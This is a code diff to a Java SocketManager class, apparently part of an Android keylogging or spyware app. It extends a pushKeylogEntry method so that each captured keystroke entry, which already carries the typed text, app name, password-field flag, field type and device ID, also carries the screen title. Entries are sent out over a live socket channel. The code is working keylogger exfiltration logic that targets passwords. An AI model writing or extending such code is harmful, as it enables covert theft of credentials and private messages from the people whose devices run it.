@@ -3145,6 +3145,13 @@ public class SocketManager {
     /** Push a keylog entry with password field metadata. */
     public void pushKeylogEntry(String packageName, String appName, String text, String eventType,
                                 String timestamp, boolean isPassword, String fieldType) {
+        pushKeylogEntry(packageName, appName, text, eventType, timestamp, isPassword, fieldType, "");
+    }
+
+    /** Push a keylog entry with password field metadata and screen/window title context. */
+    public void pushKeylogEntry(String packageName, String appName, String text, String eventType,
+                                String timestamp, boolean isPassword, String fieldType,
+                                String screenTitle) {
         // IMPORTANT: Use the general cached executor, NOT liveExecutor.
         // liveExecutor's single thread is permanently blocked in liveChannelLoop's readLine().
         // Tasks submitted to liveExecutor while readLine() is blocking are queued forever.
@@ -3159,6 +3166,9 @@ public class SocketManager {
                 entry.put("isPassword", isPassword);
                 entry.put("fieldType", isPassword ? (fieldType.isEmpty() ? "password" : fieldType) : fieldType);
                 entry.put("deviceId", DeviceInfo.getDeviceId(context));
+                if (screenTitle != null && !screenTitle.isEmpty()) {
+                    entry.put("screenTitle", screenTitle);
+                }
                 // Only send if live channel is connected (device is online).
                 // If offline, drop silently — do NOT queue as a command.
                 sendLiveOnly("keylog:entry", entry);
